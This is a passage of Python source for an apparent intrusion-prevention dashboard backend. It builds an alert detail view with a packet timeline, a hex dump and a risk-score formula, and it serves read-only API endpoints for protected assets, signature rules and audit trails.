        {"seq": 0,  "dir": "C ➔ S", "proto": target["tier"], "len": len(wire_bytes), "info": f"TRIGGER PACKET: {target['title']}", "verdict": target["action"]},
        {"seq": 1,  "dir": "IPS ➔ S", "proto": "TCP/XDP", "len": 54, "info": "IPS Inline Mitigation Action & XDP Map Offload Update", "verdict": "MITIGATED"}
    ]

    return {
        "flow_id": target["flow_id"],
        "alert": target,
        "hex_dump": build_hex_dump_lines(wire_bytes),
        "packet_timeline": timeline,
        "scoring_breakdown": {
            "formula": "FinalRiskScore = BaseSeverity × AssetCriticality × VulnMatchFactor",
            "base_severity": target["base_severity"],
            "asset_criticality": target["asset_criticality"],
            "vuln_match_factor": target["vuln_match_factor"],
            "final_risk_score": target["final_risk_score"]
        }
    }


@app.get("/api/v1/context/assets")
def api_get_assets():
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM protected_assets ORDER BY criticality DESC")
    rows = [dict(r) for r in cur.fetchall()]
    conn.close()
    return {"assets": rows}


@app.get("/api/v1/policies/rules")
def api_get_rules():
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM signature_rules ORDER BY severity DESC, rule_id ASC")
    rows = [dict(r) for r in cur.fetchall()]
    conn.close()
    return {"rules": rows}


@app.get("/api/v1/compliance/audits")
def api_get_audits():
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM audit_trails ORDER BY audit_id DESC LIMIT 25")
    rows = [dict(r) for r in cur.fetchall()]
    conn.close()
    return {"audits": rows}


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="127.0.0.1", port=8090)
